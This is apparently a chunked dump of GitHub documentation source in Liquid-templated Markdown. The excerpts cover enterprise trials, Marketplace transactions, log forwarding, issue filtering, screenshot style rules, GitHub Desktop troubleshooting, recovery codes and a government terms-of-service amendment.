variables.product.prodname_enterprise %} ends your trial, removing the 50-seat maximum and initiating payment.\n\nIf you cancel your trial or your trial expires, any existing organizations that you added to the enterprise account during the trial will be removed and reverted to their previous plans and settings. For more information about the effects of downgrading an organization, see \"AUTOTITLE.\"\n\nIf you cancel your trial, all enterprise owners and members also lose access to the enterprise account and any organizations that were created during the trial. If your trial expires, everyone retains access to the enterprise account and organizations created during the trial in a downgraded state, giving you a chance to either upgrade to {% data variables.product.prodname_enterprise %} or move your assets elsewhere.\n\n{% data reusables.enterprise-accounts.access-enterprise %}\n{% data reusables.enterprise-accounts.settings-tab %}\n{% data reusables.enterprise-accounts.billing-tab %}\n1. At the top of the page, click **Buy Enterprise** or **Cancel trial**.\n1. Foll", "Y2h1bmtfM19pbmRleF80NTk=": "ow the prompts.\n\n", "Y2h1bmtfMF9pbmRleF81MTg=": "\n\nTransaction data fields\n\n- **date:** The date of the transaction in `yyyy-mm-dd` format.\n- **app_name:** The app name.\n- **user_login:** The login of the user with the subscription.\n- **user_id:** The id of the user with the subscription.\n- **user_type:** The type of GitHub account, either `User` or `Organization`.\n- **country:** The three letter country code.\n- **amount_in_cents:** The amount of the transaction in cents. When a value is less the plan amount, the user upgraded and the new plan is prorated. A value of zero indicates the user canceled their plan.\n- **renewal_frequency:** The subscription renewal frequency, either `Monthly` or `Yearly`.\n- **marketplace_listing_plan_id:** The `id` of the subscription plan.\n- **region:** The name of the region present in billing address.\n- **postal_code:** The postal code value present in billing address.\n\n!Screenshot of the \"Transactions\" tab in the {% data variables.product.prodname_marketplace %} listing for an app. Transactions from the past week are listed in a table layout, with a search bar labeled \"Search this file...\".\n\n\n\nAccessing {% data variables.product.prodname_marketplace %} transactions\n\nTo access {% data variables.product.prodname_marketplace %} transactions:\n\n{% data reusables.user-settings.access_settings %}\n{% data reusables.user-settings.developer_settings %}\n{% data reusables.user-settings.marketplace_apps %}\n1. Select the {% data variables.product.prodname_github_app %} that you'd like to view transactions for.\n{% data reusables.user-settings.edit_marketplace_listing %}\n1. Click the **Transactions** tab.\n1. Optionally, select a different time period by clicking the Period dropdown in the upper-right corner of the Transactions page.\n\n", "Y2h1bmtfMF9pbmRleF8zOTc=": "\n\nAbout log forwarding\n\nAny log collection system that supports syslog-style log streams is supported (e.g., Logstash and Splunk).\n\nWhen you enable log forwarding, you must upload a CA certificate to encrypt communications between syslog endpoints. Your appliance and the remote syslog server will perform two-way SSL, each providing a certificate to the other and validating the certificate which is received.\n\n\n\nEnabling log forwarding\n\n{% ifversion ghes %}\n1. On the {% data variables.enterprise.management_console %} settings page, in the left sidebar, click **Monitoring**.\n1. Select **Enable log forwarding**.\n1. In the **Server address** field, type the address of the server to which you want to forward logs. You can specify multiple addresses in a comma-separated list.\n1. In the Protocol drop-down menu, select the protocol to use to communicate with the log server. The protocol will apply to all specified log destinations.\n1. Optionally, select **Enable TLS**. We recommend enabling TLS according to your local security policies, especially if there are untrusted networks between the appliance and any remote log servers.\n1. To encrypt communication between syslog endpoints, click **Choose File** and choose a CA certificate for the remote syslog server. You should upload a CA bundle containing a concatenation of the certificates of the CAs involved in signing the certificate of the remote log server. The entire certificate chain will be validated, and must terminate in a root certificate.\n{% elsif ghae %}\n{% data reusables.enterprise-accounts.access-enterprise %}\n{% data reusables.enterprise-accounts.settings-tab %}\n1. Under {% octicon \"gear\" aria-label=\"The Settings gear\" %} **Settings**, click **Log forwarding**.\n1. Under \"Log forwarding\", select **Enable log forwarding**.\n1. Under \"Server address\", enter the address of the server you want to forward logs to.\n1. Select the \"Protocol\" dropdown menu and click a protocol.\n1. Optionally, to encrypt communication between syslog endpoints using TLS, select **Enable TLS*", "Y2h1bmtfMV9pbmRleF8zOTc=": "*.\n1. Under \"Public certificate\", paste your x509 certificate.\n1. Click **Save**.\n{% endif %}\n\n{% ifversion ghes %}\n\n\n\nTroubleshooting\n\nIf you run into issues with log forwarding, contact us by visiting {% data variables.contact.contact_ent_support %} and attach the output file from `http(s)://[hostname]/setup/diagnostics` to your message.\n{% endif %}\n\n", "Y2h1bmtfMF9pbmRleF8xNDI3": "\n\nFiltering issues and pull requests\n\nIssues and pull requests come with a set of default filters you can apply to organize your listings.\n\n{% data reusables.search.requested_reviews_search %}\n\nYou can filter issues and pull requests to find:\n- All open issues and pull requests\n- Issues and pull requests that you've created\n- Issues and pull requests that are assigned to you\n- Issues and pull requests where you're **@mentioned**\n\n{% data reusables.cli.filter-issues-and-pull-requests-tip %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-issue-pr %}\n1. Above the list, select the **Filters** dropdown menu, then click the type of filter you're interested in.\n\n   !Screenshot of the list of issues for a repository. Above the list, a dropdown menu, labeled \"Filters\", is outlined in dark orange.\n\n\n\nFiltering issues and pull requests by assignees\n\nOnce you've assigned an issue or pull request to someone, you can find items based on who's working on them.\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-issue-pr %}\n1. Above the list of issues or pull requests, select the **Assignee** dropdown menu.\n\n   !Screenshot of a list of issues. In the header above the list, a dropdown menu, labeled \"Assignees\", is outlined in dark orange.\n1. The Assignee drop-down menu lists everyone who has write access to your repository. Click the name of the person whose assigned items you want to see, or click **Assigned to nobody** to see which issues are unassigned.\n\n{% tip %}\n\nTo clear your filter selection, click **Clear current search query, filters, and sorts**.\n\n{% endtip %}\n\n\n\nFiltering issues and pull requests by labels\n\nOnce you've applied labels to an issue or pull request, you can find items based on their labels.\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-issue-pr %}\n{% data reusables.project-management.labels %}\n1. In the list of labels, click a label.\n\n{% tip %}\n\n**Tip:** To clear your filter selec", "Y2h1bmtfMV9pbmRleF8xNDI3": "tion, click **Clear current search query, filters, and sorts**.\n\n{% endtip %}\n\n\n\nFiltering pull requests by review status\n\nYou can use filters to list pull requests by review status and to find pull requests that you've reviewed or other people have asked you to review.\n\nYou can filter a repository's list of pull requests to find:\n- Pull requests that haven't been reviewed yet\n- Pull requests that require a review before they can be merged\n- Pull requests that a reviewer has approved\n- Pull requests in which a reviewer has asked for changes\n- Pull requests that you have reviewed\n- Pull requests that someone has asked you directly to review\n- Pull requests that someone has asked you, or a team you're a member of, to review\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-pr %}\n1. In the upper-right corner, select the **Reviews** dropdown menu.\n\n   !Screenshot of the filter menu above the list of pull requests. The \"Reviews\" dropdown is outlined in dark orange.\n\n1. Choose a filter to find all of the pull requests with that filter's status.\n\n\n\nUsing search to filter issues and pull requests\n\nYou can use advanced filters to search for issues and pull requests that meet specific criteria.\n\n\n\nSearching for issues and pull requests\n\n{% webui %}\n\nThe issues and pull requests search bar allows you to define your own custom filters and sort by a wide variety of criteria. You can find the search bar on each repository's **Issues** and **Pull requests** tabs and on your Issues and Pull requests dashboards.\n\n!Screenshot of the list of issues for a repository. Above the list, a search field, containing the query \"is:issue is:open\", is outlined in dark orange.\n\n{% tip %}\n\n**Tip:** {% data reusables.search.search_issues_and_pull_requests_shortcut %}\n\n{% endtip %}\n\n{% endwebui %}\n\n{% cli %}\n\n{% data reusables.cli.cli-learn-more %}\n\nYou can use the {% data variables.product.prodname_cli %} to search for issues or pull requests. Use the `gh issue list` or `gh pr list` subcommand along with ", "Y2h1bmtfMl9pbmRleF8xNDI3": "the `--search` argument and a search query.\n\nFor example, you can list, in order of date created, all issues that have no assignee and that have the label `help wanted` or `bug`.\n\n```shell\ngh issue list --search 'no:assignee label:\"help wanted\",bug sort:created-asc'\n```\n\nYou can also list all pull requests that mention the `octo-org/octo-team` team.\n\n```shell\ngh pr list --search \"team:octo-org/octo-team\"\n```\n\n{% endcli %}\n\n\n\nAbout search terms\n\nWith issue and pull request search terms, you can:\n\n- Filter issues and pull requests by author: `state:open type:issue author:octocat`\n- Filter issues and pull requests that involve, but don't necessarily **@mention**, certain people: `state:open type:issue involves:octocat`\n- Filter issues and pull requests by assignee: `state:open type:issue assignee:octocat`\n- Filter issues and pull requests by label: `state:open type:issue label:\"bug\"`\n- Filter out search terms by using `-` before the term: `state:open type:issue -author:octocat`\n\n{% tip %}\n\n**Tip:** You can filter issues and pull requests by label using logical OR or using logical AND.\n- To filter issues using logical OR, use the comma syntax: `label:\"bug\",\"wip\"`.\n- To filter issues using logical AND, use separate label filters: `label:\"bug\" label:\"wip\"`.\n\n{% endtip %}\n\nFor issues, you can also use search to:\n\n- Filter for issues that are linked to a pull request by a closing reference: `linked:pr`{% ifversion issue-close-reasons %}\n- Filter issues by the reason they were closed: `is:closed reason:completed` or `is:closed reason:\"not planned\"`{% endif %}\n\nFor pull requests, you can also use search to:\n- Filter draft pull requests: `is:draft`\n- Filter pull requests that haven't been reviewed yet: `state:open type:pr review:none`\n- Filter pull requests that require a review before they can be merged: `state:open type:pr review:required`\n- Filter pull requests that a reviewer has approved: `state:open type:pr review:approved`\n- Filter pull requests in which a reviewer has asked for changes: `state:open type:pr review:ch", "Y2h1bmtfM19pbmRleF8xNDI3": "anges_requested`\n- Filter pull requests by reviewer: `state:open type:pr reviewed-by:octocat`\n- Filter pull requests by the specific user requested for review: `state:open type:pr review-requested:octocat`\n- Filter pull requests that someone has asked you directly to review: `state:open type:pr user-review-requested:@me`\n- Filter pull requests by the team requested for review: `state:open type:pr team-review-requested:github/docs`\n- Filter for pull requests that are linked to an issue that the pull request may close: `linked:issue`\n\n\n\nSorting issues and pull requests\n\nFilters can be sorted to provide better information during a specific time period.\n\nYou can sort any filtered view by:\n\n- The newest created issues or pull requests\n- The oldest created issues or pull requests\n- The most commented issues or pull requests\n- The least commented issues or pull requests\n- The newest updated issues or pull requests\n- The oldest updated issues or pull requests\n- The most added reaction on issues or pull requests\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.sidebar-issue-pr %}\n1. Above the list of issues or pull requests, select the **Sort** dropdown menu, then click a sort method.\n\n   !Screenshot of the list of issues for a repository. Above the list, a dropdown menu, labeled \"Sort,\" is outlined in dark orange.\n\nTo clear your sort selection, click **Sort** > **Newest**.\n\n\n\nSharing filters\n\nWhen you filter or sort issues and pull requests, your browser's URL is automatically updated to match the new view.\n\nYou can send the URL that issues generates to any user, and they'll be able to see the same filter view that you see.\n\nFor example, if you filter on issues assigned to Hubot, and sort on the oldest open issues, your URL would update to something like the following:\n\n```text\n/issues?q=state:open+type:issue+assignee:hubot+sort:created-asc\n```\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xMTEw": "\n\nAbout screenshots in {% data variables.product.prodname_docs %}\n\nThere are positives and negatives to adding a screenshot. Screenshots make articles more visually scannable and make instructions easier to understand, especially for people who have difficulty reading. When supplied with alt text, screenshots help blind and low-vision users collaborate with sighted colleagues.\n\nOn the other hand, screenshots privilege sighted users, add length and load time to articles, and increase the volume of content that needs to be maintained. When captured at different pixel dimensions and degrees of zoom than the reader is using, screenshots can be confusing.\n\nTherefore, we only add screenshots to {% data variables.product.prodname_docs %} when they they meet our criteria for inclusion.\n\n\n\nCriteria for including a screenshot\n\nUse a screenshot to complement text instructions when an element of the user interface (UI) is hard to find:\n\n- The element is small or visually subtle.\n- The element is not immediately visible. For example, the element is contained in a dropdown menu.\n- The interface has multiple competing choices that can cause confusion.\n\nDo not use screenshots for procedural steps where text alone is clear, or to show code commands or outputs.\n\n\n\nExamples of the criteria for inclusion\n\nTo help you determine whether to add a specific screenshot, consider the following examples of screenshots that do and do not meet our criteria for inclusion.\n\n\n\nScreenshots that meet the criteria\n\nThe following screenshots do meet our criteria for inclusion.\n\n\n\nThe UI element is small or visually subtle\n\nThe edit button for a repository's social media preview image is small and visually unobtrusive. It may be hard to find among the other repository settings.\n\n!Screenshot of an article showing text instructions and a UI screenshot for editing a social media image on a GitHub repository.\n\nThe screenshot also gives a visual reference for the aspect ratio required.\n\n\n\nThe UI element is not immediately visible\n\nOptions to clone a gist ", "Y2h1bmtfMV9pbmRleF8xMTEw": "are contained under a dropdown menu labeled \"Embed.\"\n\n!Screenshot of an article showing instructions and a UI screenshot for cloning a gist on GitHub.\n\nThe screenshot is helpful to locate the correct option in the menu, which is not visible until the dropdown is opened.\n\n\n\nThe interface has multiple choices that can cause confusion\n\nThere are three elements that could be interpreted as \"settings\" on the main page for a repository: the \"Settings\" tab, the gear icon in the \"About\" section of the right sidebar, and the account settings accessed via the profile picture.\n\n!Screenshot of an article showing instructions and a UI screenshot for locating the Settings page in a GitHub repository.\n\nThe screenshot is helpful to find the correct option.\n\n\n\nScreenshots that do not meet the criteria\n\nThe following screenshots do not meet our criteria for inclusion.\n\n\n\nThe UI element is easy to find\n\nThe \"Create repository\" button is visually prominent through size, color, and placement. There are few competing choices.\n\n!Screenshot of an article showing instructions and a UI screenshot for the final step in creating a new repository on {% data variables.product.prodname_dotcom %}.\n\nText instructions are adequate to help the user complete the step.\n\n\n\nThe UI has few, straightforward choices\n\nSimple and straightforward options, such as selecting or deselecting a checkbox, do not need a visual support.\n\n!Screenshot of an article showing instructions and a UI screenshot for requiring contributors to sign off on web-based commits.\n\nText instructions are adequate to help the user complete the step.\n\nThere are also two accessibility implications of including the full sentence of text below the checkbox in the screenshot:\n\n- The sentence is hard to read for low-sighted users, because it's small and not as crisp as HTML text.\n- A person using a screen reader won't have access to the information, because it will not fit within alt text character limits. Including the text in the instructions would remedy this, but would be unnecessarily ", "Y2h1bmtfMl9pbmRleF8xMTEw": "wordy.\n\n\n\nRequirements for screenshots\n\nIn addition to the criteria for inclusion, screenshots must meet the following requirements.\n\n\n\nTechnical specifications\n\n- PNG file format\n- Static images only (no GIFs)\n- 144 dpi\n- 750\u20131000 pixels wide for full-column images\n- File size of 250 KB or less\n- Descriptive file names, such as `gist-embed-link.png` instead of `right_side_page_03.png`\n\n\n\nAccessibility\n\nTo meet the needs of more users, screenshots must:\n\n- Be accompanied by complete instructions in the procedural step, with no information conveyed entirely in visual form.\n- Be full contrast, as in the interface itself, with nothing obscured or reduced in opacity or color contrast.\n- Have alt text that describes the content of the image and the appearance of its highlighting, if any. For more information, see \"AUTOTITLE.\"\n- Be clear and crisp, with text and UI elements as legible as possible.\n\n\n\nVisual style\n\n- Show a UI element with just enough surrounding context to help people know where to find the element on their screen.\n- Reduce negative space by resizing your browser window until optimal.\n- Show interfaces in light theme wherever possible.\n  - For {% data variables.product.prodname_dotcom %}, select \"Light default\" in your appearance settings. For more information, see \"AUTOTITLE.\"\n  - For VSCode, select \"GitHub light default\" in the free GitHub Theme extension.\n  - If the software you need to screenshot is available in dark mode only, it's fine to use dark mode.\n- If your username and avatar appear, replace them with @octocat's username and avatar. Use the developer tools in your browser to replace your username with `@octocat` and to replace the URL of your avatar with `https://avatars.githubusercontent.com/u/583231?v=4`.\n- Do not include a cursor.\n\n\n\nVisual style for dropdown menus\n\nIf the primary goal in showing a dropdown menu is to help the reader locate the menu itself, show the menu closed.\n\n!Screenshot of an article showing instructions and a UI screenshot for selecting a folder as the publishing ", "Y2h1bmtfM19pbmRleF8xMTEw": "source for {% data variables.product.prodname_pages %}.\n\nIf the primary goal in showing a dropdown menu is to help the reader distinguish among options within the menu, show the menu open. Capture open menus without focus (cursor or hover state). Showing menu items with a white background ensures contrast with the dark orange outline, where present.\n\n!Screenshot of an article showing instructions and a UI screenshot for locating the \"Settings\" menu item in the GitHub user account menu.\n\n\n\nHighlighting elements in screenshots\n\nTo highlight a specific UI element in a screenshot, use our special theme for Snagit to apply a contrasting stroke around the element.\n\nThe stroke is the color `fg.severe` in the Primer Design System (HEX #BC4C00 or RGB 188, 76, 0). This dark orange has good color contrast on both white and black. To check contrast on other background colors, use the Color Contrast Analyzer.\n\n!Screenshot of four options menus on a GitHub repository. The menu labeled \"Fork\" shows a fork count of 58.5k and is outlined in dark orange.\n\n\n\nImporting the {% data variables.product.prodname_docs %} theme into Snagit\n\n1. To download the Snagit theme, navigate to `snagit-theme-github-docs.snagtheme` in the `github/docs` repository, then click {% octicon \"download\" aria-label=\"Download raw content\" %}.\n\n   !Screenshot of the file view for \"snagit-theme-github-docs.snagtheme.\" In the header of the file, a button labeled with a download icon is outlined in dark orange.\n1. Open Snagit, then select the **Shape** tool.\n1. Under \"Quick styles,\" select **Import**.\n1. Select the Snagit theme from your computer's files. This will install the shape preset.\n1. Optionally, to add the theme to your favorites, star the dark orange rectangle.\n\n\n\nAdding a highlight to a screenshot\n\n1. Open a screenshot in Snagit.\n1. To set pixel depth (resolution) and pixel width, below the image canvas, open the \"Resize image\" dialog.\n\n   - Pixel depth: 144dpi (equivalent to \"2x\" on Snagit for Mac)\n   - Pixel width: 1000 pixels maximum\n\n   {% note %}", "Y2h1bmtfNF9pbmRleF8xMTEw": "\n\n   **Note:** On Windows, you may need to select **Advanced** to change the resolution. Ensure **Use resampling** is disabled.\n\n   {% endnote %}\n1. With the {% data variables.product.prodname_docs %} theme open in the Shapes sidebar, select the dark orange rectangle.\n1. Drag and drop across the image to create a rectangle.\n1. Adjust the rectangle's height and width by dragging edges. Do not adjust the corner rounding, which should remain 4 px. Adjust the space between the UI element and the stroke so it's about the width of the stroke itself.\n1. Export image to PNG.\n\n{% note %}\n\n**Note:** A bug in Snagit may corrupt the corner rounding, causing rectangles to become ovals. If this occurs, delete and reinstall the {% data variables.product.prodname_docs %} theme (Windows and Mac), or click and drag the yellow dot at the top right of the shape to reset corner rounding to 4 px (Mac only).\n\n{% endnote %}\n\n\n\nReplacing screenshots\n\nWhen replacing an existing image, best practice is to retain the image's filename.\n\nIf you must change an image filename, search the repository for other references to that image and update all references to the original filename.\n\nIf the image is used in deprecated versions of {% data variables.product.prodname_ghe_server %} documentation, don't change the filename.\n\n\n\nVersioning images in Markdown content\n\nSome images apply to all {% data variables.product.prodname_dotcom %} plans ({% data variables.product.prodname_free_user %}, {% data variables.product.prodname_pro %}, {% data variables.product.prodname_team %}, {% data variables.product.prodname_ghe_cloud %}, and {% data variables.product.prodname_ghe_server %}). In this case, there is no versioning required.\n\nWhen an image does differ from plan to plan, or changes in a newer release of {% data variables.product.prodname_ghe_server %}, the image need to be versioned with Liquid conditional statements. You may need to add this versioning when the content is initially created, or you may need to add it when the content is updated for a f", "Y2h1bmtfNV9pbmRleF8xMTEw": "eature update or {% data variables.product.prodname_ghe_server %} release.\n\n\n\nImage locations\n\nImages are located in the `/assets/images` directory. This directory has some sub-directories that can be used to organize content by plan and release number.\n\nDirectory | Usage\n--------- | ------\n`/assets/images` | Images that are not specific to any {% data variables.product.prodname_enterprise %} product.\n`/assets/images/enterprise/enterprise-server` | Images that are applicable to all releases of {% data variables.product.prodname_ghe_server %} (GHES), or are applicable to the current release and future releases.\n`/assets/images/enterprise/`, such as `/assets/images/enterprise/3.0/` | When an image is changed in a new GHES release, add the new image to the original location, and move the old image to the directory corresponding to the latest release that the image applies to.\n\n\n\nExample: An image differs between plans\n\nWhen there are differences between plans, you can use Liquid conditionals to version the two images.\n\n```markdown\n{% raw %}\n{% ifversion fpt or ghec %}\n!An image of foo bar for GitHub Free, GitHub Pro, GitHub Team, and GitHub Enterprise Cloud\n{% else %}\n!An image of foo bar for GHES\n{% endif %}{% endraw %}\n```\n\n\n\nExample: An image is updated in a new {% data variables.product.prodname_ghe_server %} release\n\nIf an image will change for {% data variables.product.prodname_ghe_server %} 3.10, and the updated image will be used for all future versions of {% data variables.product.prodname_ghe_server %}, move the existing image to `/assets/images/enterprise/3.10`, then add the new image to the original location, `/assets/images/enterprise/foo/bar.png`.\n\nYour Liquid conditional would look like this:\n\n```markdown\n{% raw %}\n{% ifversion fpt or ghec %}\n!An image of foo bar\n{% elsif ghes < 3.10 %}\n!An image of foo bar for GHES 3.9 and lower\n{% else %}\n!An image of foo bar for GHES 3.10+\n{% endif %}{% endraw %}\n```\n\nWhen the 3.10 release is deprecated, the `/assets/images/enterprise/3.10` directory will be remove", "Y2h1bmtfNl9pbmRleF8xMTEw": "d.\n\nThe numbered release directory should contain images that apply to that release number only or to that release number and earlier. For example, images in `/assets/images/enterprise/2.22` should contain images that apply to 2.22 only or 2.22 and earlier.\n\n", "Y2h1bmtfMF9pbmRleF81MDA=": "---\ntitle: About the setup URL\nintro: 'You can specify a URL that users will be redirected to after they install a {% data variables.product.prodname_github_app %}.'\nversions:\n  fpt: '*'\n  ghes: '*'\n  ghae: '*'\n  ghec: '*'\ntopics:\n  - GitHub Apps\nshortTitle: Setup URL\nredirect_from:\n  - /apps/creating-github-apps/setting-up-a-github-app/about-the-setup-url\n---\n\nWhen you register a {% data variables.product.prodname_github_app %}, you can specify a setup URL. When users install your {% data variables.product.prodname_github_app %}, they are redirected to the setup URL. If additional setup is required after installation, you can use this URL to tell users what steps to take next.\n\nIf you specify a setup URL, you can also select **Redirect on update** to specify that users should be redirected to the setup URL after they update an installation. An update includes adding or removing access to a repository for an installation.\n\n{% warning %}\n\n**Warning**: When {% data variables.product.company_short %} redirects users to the setup URL, it includes an `installation_id` query parameter. Bad actors can hit this URL with a spoofed `installation_id`. Therefore, you should not rely on the validity of the `installation_id` parameter. Instead, you should generate a user access token for the user who installed the {% data variables.product.prodname_github_app %} and then check that the installation is associated with that user. For more information, see \"AUTOTITLE.\"\n\n{% endwarning %}\n\n{% ifversion fpt or ghec %}\nAlthough the setup URL is optional during {% data variables.product.prodname_github_app %} registration, it is required if you want to allow users to purchase your app in {% data variables.product.prodname_marketplace %}. For more information, see \"AUTOTITLE.\"\n{% endif %}\n\nThe setup URL is different from the callback URL. Users are redirected to the setup URL after they install a {% data variables.product.prodname_github_app %}. Users are redirected to the callback URL when they authorize a {% data variables.product.pr", "Y2h1bmtfMV9pbmRleF81MDA=": "odname_github_app %} via the web application flow. For more information, see \"AUTOTITLE.\"\n\nFor more information about registering a {% data variables.product.prodname_github_app %}, see \"AUTOTITLE.\" For more information about modifying a {% data variables.product.prodname_github_app %} registration, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xOTYx": "\n\nAbout repository autolinks\n\nTo help streamline your workflow, you can use the REST API to add autolinks to external resources like JIRA issues and Zendesk tickets. For more information, see \"AUTOTITLE.\"\n\n{% data variables.product.prodname_github_apps %} require repository administration permissions with read or write access to use these endpoints.\n\n\n\n", "Y2h1bmtfMF9pbmRleF8xMTc5": "\n\nAbout supported operating systems\n\nThe following operating systems are supported for {% data variables.product.prodname_desktop %}.\n- {% data variables.desktop.mac-osx-versions %}\n- {% data variables.desktop.windows-versions %}. You must have a 64-bit operating system to run {% data variables.product.prodname_desktop %}.\n\n\n\nTroubleshooting problems on macOS\n\nIf you're encountering problems using {% data variables.product.prodname_desktop %} on macOS, here are resolutions to try. For more information, see `known-issues`.\n\n\n\n`The username or passphrase you entered is not correct` error after signing into your account\n\nThis error can occur when {% data variables.product.prodname_desktop %} can't access your stored credentials on Keychain.\n\nTo troubleshoot this error, follow these steps.\n\n1. Open the \"Keychain Access\" app.\n1. In the left sidebar, in the list of keychains, right-click **login** and then click **Lock Keychain \"login\"**.\n1. Right-click **login** and click **Unlock Keychain \"login\"**. Follow any onscreen prompts to finish unlocking the Keychain \"login.\"\n1. Re-authenticate your account on {% data variables.product.prodname_dotcom %} or {% data variables.product.prodname_enterprise %}.\n\n\n\n`Could not create temporary directory: Permission denied` error after checking for updates\n\nThis error can be caused by missing permissions for the `~/Library/Caches/com.github.GitHubClient.ShipIt` directory. {% data variables.product.prodname_desktop %} uses this directory to create and unpack temporary files as part of updating the application.\n\nTo troubleshoot this error, follow these steps.\n\n1. Close {% data variables.product.prodname_desktop %}.\n1. Open \"Finder\" and navigate to `~/Library/Caches/`.\n1. Right-click `com.github.GitHubClient.ShipIt` and then click **Get Info**.\n1. Click the arrow to the left of \"Sharing & Permissions.\"\n1. If the Privilege to the right of your user account does not say \"Read & Write,\" click the text and then click **Read & Write**.\n   !Screenshot of the info window on a Mac. Under \"Shar", "Y2h1bmtfMV9pbmRleF8xMTc5": "ing and permissions\", a context menu is open, with \"Read & Write\" marked by a checkmark.\n1. Open {% data variables.product.prodname_desktop %} and check for updates.\n\n\n\nTroubleshooting problems on Windows\n\nIf you're encountering problems using {% data variables.product.prodname_desktop %} on Windows, here are resolutions to try. For more information, see `known-issues`.\n\n\n\n`The revocation function was unable to check revocation for the certificate.` error\n\nThis error can occur if you are using {% data variables.product.prodname_desktop %} on a corporate network that blocks Windows from checking the revocation status of a certificate.\n\nTo troubleshoot, contact your system administrator.\n\n\n\n`git clone failed` error while cloning a repository configured with Folder Redirection\n\n{% data variables.product.prodname_desktop %} does not support repositories configured with Folder Redirection.\n\n\n\n`cygheap base mismatch detected` error\n\nThis error can occur when Mandatory ASLR is enabled. Enabling Mandatory ASLR affects the MSYS2 core library, which {% data variables.product.prodname_desktop %} relies upon to emulate process forking.\n\nTo troubleshoot this error, either disable Mandatory ASLR or explicitly allow all executables under `\\usr\\bin` which depend on MSYS2.\n\n\n\n`This operating system is no longer supported. Software updates have been disabled` notification\n\nThis notification is shown if you are running a version of Windows that is no longer compatible with {% data variables.product.prodname_desktop %}. {% data variables.product.prodname_desktop %} supports {% data variables.desktop.windows-versions %}. If you are running a supported Windows operating system and are seeing this notification, this may be because compatibility mode has been enabled for {% data variables.product.prodname_desktop %}. To check if compatibility mode is enabled, follow these steps.\n\n1. Open the Windows **Start Menu**.\n1. Search for \"{% data variables.product.prodname_desktop %}\".\n1. Select and hold (or right-click) **{% data variables.prod", "Y2h1bmtfMl9pbmRleF8xMTc5": "uct.prodname_desktop %}** and click **Open file location**.\n1. Select and hold (or right-click) the {% data variables.product.prodname_desktop %} shortcut and click **Properties**.\n1. Select the **Compatibility** tab.\n1. In the \"Compatibility mode\" section, ensure that the **Run this program in compatibility mode** checkbox is deselected.\n\n", "Y2h1bmtfMF9pbmRleF8zMDg=": "\n\nAbout recovery codes\n\nYou can use a recovery code to access your enterprise account when an authentication configuration error or an issue with your identity provider (IdP) prevents you from using SSO.\n\nIn order to access your enterprise account this way, you must have previously downloaded and stored the recovery codes for your enterprise. For more information, see \"AUTOTITLE.\"\n\n{% data reusables.saml.recovery-code-caveats %}\n\n\n\nUsing a recovery code\n\n{% note %}\n\n**Note:** If your enterprises uses {% data variables.product.prodname_emus %}, you must sign in as the setup user to use a recovery code.\n\n{% endnote %}\n\n1. Attempt to access the enterprise account.\n{% data reusables.saml.recovery-code-access %}\n\n", "Y2h1bmtfMF9pbmRleF8yMDc0": "\n\nA. Public purpose\n\n1. _Government entity_ - \"You\" within the ToS shall mean the Government itself and shall not bind, in their individual capacity, the individual(s) who utilize the Company site or services on the Government's behalf. Company will look solely to the Government to enforce any violation or breach of the ToS by such individuals, subject to federal law.\n\n1. _Advertisements_ - Company hereby agrees not to serve or display any third-party commercial advertisements or solicitations on any pages within the Company site displaying content created by or under the control of the Government. This exclusion shall not extend to house ads, which Company may serve on such pages in a non-intrusive manner. The foregoing obligations are contingent upon the email address designated on Your account details page ending in `.gov`, `.mil`, or `.fed.us`.\n\n\n\nB. Your content on GitHub\n\n1. _Access and use_ - Company acknowledges that the Government's use of the Service may energize significant citizen engagement. Language in the ToS allowing Company to terminate service, refuse or remove any Content, or close the Government's account, at any time, for any reason, is modified to reflect the Parties' agreement that Company may unilaterally modify or discontinue service, temporarily or permanently, refuse or remove any Content, and/or terminate the Government's account only for breach of the Government\u2019s obligations under the ToS or its material failure to comply with the instructions and guidelines posted on the Service, or if Company ceases to operate the Service generally. Company will provide the Government with a reasonable opportunity to cure any breach or failure on the Government's part.\n\n1. _No endorsement_ - Company agrees that Your seals, trademarks, logos, service marks, trade names, and the fact that You have a presence on the Company site and use its services, shall not be used by Company in such a manner as to state or imply that Company's products or services are endorsed, sponsored or recommended by You or b", "Y2h1bmtfMV9pbmRleF8yMDc0": "y any other element of the federal government, or are considered by these entities to be superior to any other products or services. Except for pages whose design and content is under the control of the Government, or for links to or promotion of such pages, Company agrees not to display any government seals or logos on the Company's homepage or elsewhere on the Company Site, unless permission to do so has been granted by the Government or by other relevant federal government authority. Company may list the Government's name in a publicly available customer list so long as the name is not displayed in a more prominent fashion than that of any other third-party name.\n\n1. _Provision of data_ - In case of termination of service, within 30 days of such termination, upon request, Company will provide you with all user-generated content that is publicly visible through the Sites You created at Company. Data will be provided in a commonly used file or database format as Company deems appropriate. Company will not provide data if doing so would violate its privacy policy, available at https://docs.github.com/privacy.\n\n\n\nC. Unpaid and paid plans\n\n1. _No cost agreement_ - Nothing in this Amendment or ToS obligates You to expend appropriations or incur financial obligations. The Parties acknowledge and agree that none of the obligations arising from this Amendment or ToS are contingent upon the payment of fees by one party to the other. At the Company\u2019s discretion, GitHub may offer a free account under a free usage plan, such as a Free for Open Source Plan, and in that case this Amendment will apply to the Government\u2019s usage under the free account/plan. This Amendment also applies when the Government uses one of GitHub\u2019s paid usage plans.\n\n1. _Government responsibilities under paid usage plans_ - You acknowledge that while Company will provide You with service under a free plan, Company reserves the right to begin charging for that service at some point in the future. Company will provide You with at least 30 days advance n", "Y2h1bmtfMl9pbmRleF8yMDc0": "otice of a change involving the charging of fees for a free service. You also understand that Company offers paid plans for a fee. The Parties understand that fee-based services are categorically different than free products, and are subject to federal procurement rules and processes. Before the Government decides to enter into a business or enterprise subscription, or any other fee-based service that this Company or alternative providers may offer now or in the future, You agree: to determine the Government has a need for those additional services for a fee; to consider the subscription's value in comparison with comparable services available elsewhere; to determine that Government funds are available for payment; to properly use the Government Purchase Card if that Card is used as the payment method; to review any then-applicable ToS for conformance to federal procurement law; and in all other respects to follow applicable federal acquisition laws, regulations and agency guidelines (including those related to payments) when initiating that separate action.\n\n1. _No business relationship created_ - The Parties are independent entities and nothing in this Amendment or ToS creates an agency, partnership, joint venture, or employer/employee relationship.\n\n\n\nD. Federal 